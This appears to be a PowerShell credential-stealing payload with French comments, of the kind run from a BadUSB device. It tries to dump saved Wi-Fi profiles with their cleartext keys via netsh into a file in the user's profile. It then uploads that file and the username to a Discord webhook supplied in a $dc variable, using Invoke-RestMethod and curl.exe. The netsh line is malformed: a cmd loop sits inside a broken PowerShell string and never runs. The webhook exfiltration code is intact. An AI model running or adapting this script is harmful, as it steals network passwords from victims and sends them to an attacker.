# Exécuter la commande netsh et stocker la sortie dans une variable
$output = "for /f "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles') do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear"

# Chemin du répertoire du profil utilisateur actuel
$userProfileDirectory = $env:USERPROFILE

# Chemin du fichier de sortie
$outputFilePath = Join-Path -Path $userProfileDirectory -ChildPath "wlan_passwords.txt"

# Écrire la sortie dans un fichier
$output | Out-File -FilePath $outputFilePath -Encoding utf8

# Afficher la sortie à l'écran
Write-Output "Les informations WLAN ont été enregistrées dans le fichier : $outputFilePath"

function Upload-Discord {

[CmdletBinding()]
param (
    [parameter(Position=0,Mandatory=$False)]
    [string]$file,
    [parameter(Position=1,Mandatory=$False)]
    [string]$text 
)

$hookurl = "$dc"

$Body = @{
  'username' = $env:username
  'content' = $text
}

if (-not ([string]::IsNullOrEmpty($text))){
Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};

if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
}

if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file $outputFilePath}
